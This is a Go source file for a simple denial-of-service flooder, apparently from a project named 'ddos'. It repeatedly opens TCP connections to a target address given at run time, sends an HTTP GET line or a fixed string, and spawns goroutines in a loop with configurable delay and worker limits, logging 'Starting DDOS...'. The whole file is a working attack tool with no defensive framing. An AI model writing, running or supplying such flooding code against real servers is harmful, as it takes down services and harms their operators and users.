package main

import (
	"ddos/logger"
	"ddos/options"
	"fmt"
	"net"
	"os"
	"time"
)

const (
	HttpMessage   = "GET / HTTP/1.1\n"
	SocketMessage = "abcdefghijklmnopqrstuvwxyz1234567890"
)

func ddos(opt options.Options) error {
	conn, err := net.Dial("tcp", opt.Address)
	if err != nil {
		return err
	}

	message := ""
	if opt.Message != "" {
		message = opt.Message
	} else {
		if opt.Http {
			message = HttpMessage
		} else {
			message = SocketMessage
		}
	}
	_, err = fmt.Fprintf(conn, "%v\n", message)
	if err != nil {
		return err
	}

	err = conn.Close()
	if err != nil {
		return err
	}

	return nil
}

func main() {
	opt := options.Parse()
	log := logger.NewLogger(opt.LogLevel, opt.NoColor)
	currentRetryCount := 0
	currentWorkerCount := 0

	err := ddos(opt)
	if err != nil {
		log.Log("ERROR", "Couldn't run test-connect, error: %v...", err)

		if !opt.IgnoreError {
			os.Exit(1)
		}
	}

	log.Log("INFO", "Starting DDOS...")

	for {
		go func() {
			err := ddos(opt)
			if err != nil {
				log.Log("WARN", "%v", err)

				if opt.MaxRetryCount <= 0 {
					return
				}

				if currentRetryCount += 1; currentRetryCount > opt.MaxRetryCount {
					log.Log("INFO", "Reached max retry count (%v), exiting...", opt.MaxRetryCount)

					if !opt.IgnoreError {
						os.Exit(1)
					}
				}
			} else {
				log.Log("INFO", "Successfully send packet to %v...", opt.Address)
			}
		}()

		time.Sleep(time.Millisecond * time.Duration(opt.Delay))

		if opt.WorkerCount <= 0 {
			continue
		}

		currentWorkerCount++
		if currentWorkerCount >= opt.WorkerCount {
			log.Log("INFO", "Worker count reached (%v), exiting...", opt.WorkerCount)
			break
		}
	}
}
